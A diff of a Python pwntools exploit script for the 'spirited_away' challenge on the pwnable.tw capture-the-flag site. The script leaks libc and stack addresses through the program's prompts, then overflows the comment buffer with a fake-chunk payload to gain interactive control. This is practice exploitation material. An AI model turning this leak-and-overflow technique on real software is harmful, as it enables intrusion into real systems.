@@ -1,57 +1,66 @@
 from pwn import *
 
-BEDUG=True
+BEDUG = True
 
-if BEDUG==True:
-    io = process('./spirited_away')
+libc = ELF('./libc.so.6')
+
+if BEDUG == True:
+	io = process('./spirited_away_patched', env = {"LD_PRELOAD":"./libc.so.6"})
 else:
-    io = remote('chall.pwnable.tw', 10204)
+	io = remote('0.0.0.0', 1337)
 
-#io = process('./spirited_away', env={"LD_PRELOAD":"./libc_32.so.6"})
-libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+def comment(name, reason, cmt):
+	io.recvuntil(b'Please enter your name: ')
+	io.send(name)
+	#io.sendlineafter(b'Please enter your age: ', age)
+	io.recvuntil(b'Why did you came to see this movie? ')
+	io.send(reason)
+	io.recvuntil(b'Please enter your comment: ')
+	io.send(cmt)
+
+io.recvuntil(b'Please enter your name: ')
+io.send(b'A')
+io.sendlineafter(b'Please enter your age: ', b'A')
+io.recvuntil(b'Why did you came to see this movie? ')
+io.send(b'A')
+io.recvuntil(b'Please enter your comment: ')
+io.send(b'A')
+io.sendlineafter(b'<y/n>: ', b'y')
+
+comment(b'A', b'A'*20, b'B')
+io.recvuntil(b'Reason: ')
+io.recv(20)
+libc.address = u32(io.recv(4)) - 0x5f29b
+io.sendlineafter(b'<y/n>: ', b'y')
+comment(b'A', b'A'*0x38, b'B')
+io.recvuntil(b'Reason: ')
+io.recv(0x38)
+stack_leaked = u32(io.recv(4))
+fake_chunk = stack_leaked - 92
+io.sendlineafter(b'<y/n>: ', b'y')
+
+log.info('Libc: '+hex(libc.address))
+log.info('Stack: '+hex(stack_leaked))
+log.info('Fake chunk: '+hex(fake_chunk))
+
+for i in range(7):
+	io.recvuntil(b'Please enter your name: ')
+	io.send(b'y')
+	io.recvuntil(b'Why did you came to see this movie? ')
+	io.send(b'y')
+	io.recvuntil(b'Please enter your comment: ')
+	io.send(b'y')
+	io.sendlineafter(b'<y/n>: ', b'y')
+
+for i in range(90):
+	io.recvuntil(b'Why did you came to see this movie? ')
+	io.send(b'y')
+	io.sendlineafter(b'<y/n>: ', b'y')
+
+payload = p32(fake_chunk+0x33) + p32(0)*4+p32(0x41)
+
+comment(b'A', b'ok', b'A'*84+payload)
+pause()
 
 
-def new_comment(name, age, reason, comment, choice = b'y'):
-    print(io.recvuntil(b'Please enter your name: '))
-    io.sendline(name)
-    print(io.recvuntil(b'Please enter your age: '))
-    io.sendline(str(age).encode('utf-8'))
-    print(io.recvuntil(b'Why did you came to see this movie? '))
-    io.sendline(reason)
-    print(io.recvuntil(b'Please enter your comment: '))
-    io.sendline(comment)
-    print(io.recvuntil(b'Would you like to leave another comment? <y/n>: '))
-    io.sendline(choice)
-
-
-print(io.recvuntil(b'Please enter your name: '))
-io.sendline(b'A')
-print(io.recvuntil(b'Please enter your age: '))
-io.sendline(b'1')
-print(io.recvuntil(b'Why did you came to see this movie? '))
-io.sendline(b'A'*19)
-print(io.recvuntil(b'Please enter your comment: '))
-io.sendline(b'A')
-print(io.recvuntil(b'Reason: '))
-print(io.recv(20))
-libc.address = u32(io.recv(4)) - 0x5fe0b
-print(hex(libc.address))
-print(io.recvuntil(b'Would you like to leave another comment? <y/n>: '))
-io.sendline(b'y')
-
-for i in range(100):
-    new_comment(b'A', b'1', b'A', b'A')
-
-# overwritten = 0x6e = 110
-
-print(io.recvuntil(b'Please enter your name: '))
-io.sendline(b'A'*109)
-print(io.recvuntil(b'Please enter your age: '))
-io.sendline(b'1')
-print(io.recvuntil(b'Why did you came to see this movie? '))
-io.sendline(b'A')
-print(io.recvuntil(b'Please enter your comment: '))
-io.sendline(b'A'*109)
-print(io.recvuntil(b'Would you like to leave another comment? <y/n>: '))
-io.sendline(b'n')
-print(io.recv())
+io.interactive()
